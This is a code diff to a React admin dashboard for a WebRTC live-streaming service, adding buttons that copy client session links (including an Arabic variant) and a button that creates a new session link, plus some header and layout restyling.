@@ -12,10 +12,122 @@ import {
   Phone,
   Play,
   Shield,
+  Copy,
+  Check,
+  Plus,
+  Globe,
 } from 'lucide-react';
 
 interface AdminDashboardProps {
   onLogout: () => void;
+}
+
+function CopyClientLinkButton({ sessionId }: { sessionId: string }) {
+  const [copied, setCopied] = useState(false);
+
+  const handleCopy = async (e: React.MouseEvent) => {
+    e.stopPropagation();
+    if (typeof window === 'undefined') return;
+    const clientUrl = `${window.location.origin}/?sessionId=${sessionId}`;
+    try {
+      if (navigator.clipboard && window.isSecureContext) {
+        await navigator.clipboard.writeText(clientUrl);
+      } else {
+        const textArea = document.createElement('textarea');
+        textArea.value = clientUrl;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        document.execCommand('copy');
+        textArea.remove();
+      }
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2500);
+    } catch (err) {
+      console.warn('Failed to copy', err);
+    }
+  };
+
+  return (
+    <button
+      type="button"
+      onClick={handleCopy}
+      title={`نسخ رابط العميل: ${typeof window !== 'undefined' ? window.location.origin : ''}/?sessionId=${sessionId}`}
+      className={`inline-flex items-center gap-1 px-2 py-0.5 text-xs font-medium rounded-md border transition-all ${
+        copied
+          ? 'bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-800'
+          : 'bg-blue-50 text-blue-700 hover:bg-blue-100 border-blue-200 dark:bg-blue-950/60 dark:text-blue-300 dark:hover:bg-blue-900/60 dark:border-blue-800'
+      }`}
+    >
+      {copied ? (
+        <>
+          <Check className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
+          <span className="text-[11px] font-semibold text-emerald-700 dark:text-emerald-300">تم النسخ!</span>
+        </>
+      ) : (
+        <>
+          <Copy className="w-3 h-3" />
+          <span className="text-[11px]">نسخ رابط العميل</span>
+        </>
+      )}
+    </button>
+  );
+}
+
+function CopyArabicLinkButton({ sessionId }: { sessionId: string }) {
+  const [copied, setCopied] = useState(false);
+
+  const handleCopy = async (e: React.MouseEvent) => {
+    e.stopPropagation();
+    if (typeof window === 'undefined') return;
+    const clientUrl = `${window.location.origin}/?sessionId=${sessionId}&lang=ar`;
+    try {
+      if (navigator.clipboard && window.isSecureContext) {
+        await navigator.clipboard.writeText(clientUrl);
+      } else {
+        const textArea = document.createElement('textarea');
+        textArea.value = clientUrl;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        document.execCommand('copy');
+        textArea.remove();
+      }
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2500);
+    } catch (err) {
+      console.warn('Failed to copy arabic link', err);
+    }
+  };
+
+  return (
+    <button
+      type="button"
+      onClick={handleCopy}
+      title={`نسخ رابط العميل باللغة العربية: ${typeof window !== 'undefined' ? window.location.origin : ''}/?sessionId=${sessionId}&lang=ar`}
+      className={`inline-flex items-center gap-1 px-2 py-0.5 text-xs font-medium rounded-md border transition-all ${
+        copied
+          ? 'bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-800'
+          : 'bg-amber-50 text-amber-800 hover:bg-amber-100 border-amber-200 dark:bg-amber-950/60 dark:text-amber-300 dark:hover:bg-amber-900/60 dark:border-amber-800'
+      }`}
+    >
+      {copied ? (
+        <>
+          <Check className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
+          <span className="text-[11px] font-semibold text-emerald-700 dark:text-emerald-300">تم النسخ (عربي)!</span>
+        </>
+      ) : (
+        <>
+          <Globe className="w-3 h-3" />
+          <span className="text-[11px]">رابط عربي 🇸🇦</span>
+        </>
+      )}
+    </button>
+  );
 }
 
 function areSessionsEqual(a: UserSession[], b: UserSession[]): boolean {
@@ -37,6 +149,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
   const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState<boolean>(true);
   const [lastRefreshed, setLastRefreshed] = useState<Date>(new Date());
+  const [isCreatingSession, setIsCreatingSession] = useState<boolean>(false);
   
   // Track sessions that are streaming to auto-focus immediately when user approves camera
   const prevStreamingIdsRef = useRef<Set<string>>(new Set());
@@ -117,37 +230,62 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
     };
   }, [fetchSessions]);
 
-  const handleTerminateSession = async (sessionId: string) => {
+  const handleCreateDirectSession = async () => {
+    setIsCreatingSession(true);
     try {
-      await fetch(`/api/sessions/${sessionId}`, { method: 'DELETE' });
-      setSessions((prev) => prev.filter((s) => s.id !== sessionId));
-      if (selectedSessionId === sessionId) {
-        setSelectedSessionId(null);
+      const res = await fetch('/api/sessions', { method: 'POST' });
+      const data = await res.json();
+      if (res.ok && data.sessionId) {
+        setSelectedSessionId(data.sessionId);
+        await fetchSessions();
+        if (typeof window !== 'undefined') {
+          const clientUrl = `${window.location.origin}/?sessionId=${data.sessionId}`;
+          try {
+            if (navigator.clipboard && window.isSecureContext) {
+              await navigator.clipboard.writeText(clientUrl);
+            }
+          } catch (_) {}
+        }
       }
-    } catch (e) {
-      console.error('Error terminating session', e);
+    } catch (err) {
+      console.error('Failed to create direct session:', err);
+    } finally {
+      setIsCreatingSession(false);
     }
   };
 
-  const selectedSession = useMemo(
-    () => sessions.find((s) => s.id === selectedSessionId) || null,
-    [selectedSessionId, sessions]
-  );
+  const handleTerminateSession = async (sessionId: string) => {
+    try {
+      await fetch(`/api/sessions/${sessionId}`, { method: 'DELETE' });
+      if (selectedSessionId === sessionId) {
+        setSelectedSessionId(null);
+      }
+      setSessions((prev) => prev.filter((s) => s.id !== sessionId));
+    } catch (err) {
+      console.error('Failed to terminate session:', err);
+    }
+  };
+
+  const selectedSession = useMemo(() => {
+    return sessions.find((s) => s.id === selectedSessionId) || null;
+  }, [sessions, selectedSessionId]);
 
   return (
-    <div className="min-h-screen bg-zinc-50 dark:bg-zinc-950 text-zinc-900 dark:text-zinc-100">
-      {/* Navigation Bar */}
-      <header className="border-b border-zinc-200 dark:border-zinc-800 bg-white/80 dark:bg-zinc-900/80 backdrop-blur-md sticky top-0 z-20">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+    <div className="min-h-screen bg-zinc-50 dark:bg-zinc-950 text-zinc-900 dark:text-zinc-100 flex flex-col font-sans transition-colors">
+      {/* Header */}
+      <header className="sticky top-0 z-40 w-full border-b border-zinc-200 dark:border-zinc-800 bg-white/80 dark:bg-zinc-900/80 backdrop-blur-md">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
           <div className="flex items-center gap-3">
             <div className="w-9 h-9 rounded-xl bg-blue-600 flex items-center justify-center text-white shadow-md shadow-blue-500/20">
               <Shield className="w-5 h-5" />
             </div>
             <div>
-              <h1 className="text-base font-bold tracking-tight">Admin-Kontrollzentrum</h1>
-              <p className="text-xs text-zinc-500 dark:text-zinc-400">
-                WebRTC Live-Streaming & Sitzungsverwaltung
-              </p>
+              <h1 className="text-base font-bold leading-none text-zinc-900 dark:text-white">
+                Admin-Leitstelle
+              </h1>
+              <span className="text-xs text-zinc-500 dark:text-zinc-400">
+                Echtzeit-Überwachungssystem
+              </span>
             </div>
           </div>
 
@@ -155,15 +293,14 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
             <button
               onClick={fetchSessions}
               title="Aktualisieren"
-              className="p-2 rounded-xl border border-zinc-200 dark:border-zinc-700 bg-zinc-50 dark:bg-zinc-800 hover:bg-zinc-100 dark:hover:bg-zinc-700 text-zinc-600 dark:text-zinc-300 transition-all text-xs flex items-center gap-1.5"
+              className="p-2 rounded-xl bg-zinc-100 dark:bg-zinc-800 hover:bg-zinc-200 dark:hover:bg-zinc-700 text-zinc-600 dark:text-zinc-300 transition-all"
             >
-              <RefreshCw className="w-3.5 h-3.5" />
-              <span className="hidden sm:inline">Aktualisieren</span>
+              <RefreshCw className="w-4 h-4" />
             </button>
 
             <button
               onClick={onLogout}
-              className="p-2 rounded-xl border border-red-200 dark:border-red-900/60 bg-red-50 dark:bg-red-950/40 hover:bg-red-100 dark:hover:bg-red-900/50 text-red-600 dark:text-red-400 transition-all text-xs flex items-center gap-1.5 font-medium"
+              className="py-2 px-3.5 rounded-xl text-xs font-semibold bg-red-50 hover:bg-red-100 text-red-700 dark:bg-red-950/40 dark:hover:bg-red-900/50 dark:text-red-300 border border-red-200 dark:border-red-900 transition-all flex items-center gap-1.5"
             >
               <LogOut className="w-3.5 h-3.5" />
               <span>Abmelden</span>
@@ -173,7 +310,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
       </header>
 
       {/* Main Content */}
-      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+      <main className="max-w-7xl mx-auto w-full px-4 sm:px-6 lg:px-8 py-8 space-y-8">
         {/* Stream viewer if a session is selected */}
         {selectedSession && (
           <section className="space-y-3">
@@ -199,7 +336,17 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
               </p>
             </div>
 
-            <div className="flex items-center gap-2">
+            <div className="flex items-center gap-2 flex-wrap">
+              <button
+                type="button"
+                onClick={handleCreateDirectSession}
+                disabled={isCreatingSession}
+                title="إنشاء جلسة جديدة ونسخ الرابط مباشرة"
+                className="px-3 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-medium text-xs flex items-center gap-1.5 shadow-sm transition-all disabled:opacity-50"
+              >
+                <Plus className="w-3.5 h-3.5" />
+                <span>{isCreatingSession ? 'Wird erstellt...' : 'إنشاء رابط عميل جديد'}</span>
+              </button>
               <span className="text-xs font-semibold px-3 py-1 rounded-full bg-blue-50 dark:bg-blue-950/60 border border-blue-200 dark:border-blue-900 text-blue-700 dark:text-blue-300">
                 {sessions.length} {sessions.length === 1 ? 'Sitzung' : 'Sitzungen'} online
               </span>
@@ -218,6 +365,15 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
               <p className="mt-1 text-sm text-zinc-500 dark:text-zinc-400 max-w-sm mx-auto">
                 Sobald ein Benutzer seine Telefonnummer verifiziert und die Kamera freigibt, erscheint der Stream hier in Echtzeit.
               </p>
+              <button
+                type="button"
+                onClick={handleCreateDirectSession}
+                disabled={isCreatingSession}
+                className="mt-4 px-4 py-2 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-medium text-xs inline-flex items-center gap-2 shadow-sm transition-all disabled:opacity-50"
+              >
+                <Plus className="w-4 h-4" />
+                <span>إنشاء رابط عميل مباشر (Direct Link)</span>
+              </button>
             </div>
           ) : (
             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
@@ -240,9 +396,13 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
                   >
                     <div className="space-y-3">
                       <div className="flex items-center justify-between gap-2">
-                        <span className="font-mono text-xs font-semibold px-2 py-0.5 rounded bg-zinc-100 dark:bg-zinc-800 text-zinc-600 dark:text-zinc-300">
-                          {session.id.substring(0, 8)}...
-                        </span>
+                        <div className="flex items-center gap-1.5 flex-wrap">
+                          <span className="font-mono text-xs font-semibold px-2 py-0.5 rounded bg-zinc-100 dark:bg-zinc-800 text-zinc-600 dark:text-zinc-300">
+                            {session.id.substring(0, 8)}...
+                          </span>
+                          <CopyClientLinkButton sessionId={session.id} />
+                          <CopyArabicLinkButton sessionId={session.id} />
+                        </div>
                         <ConnectionStatus
                           status={session.streamStatus === 'streaming' ? 'connected' : 'connecting'}
                           isLive={session.streamStatus === 'streaming'}
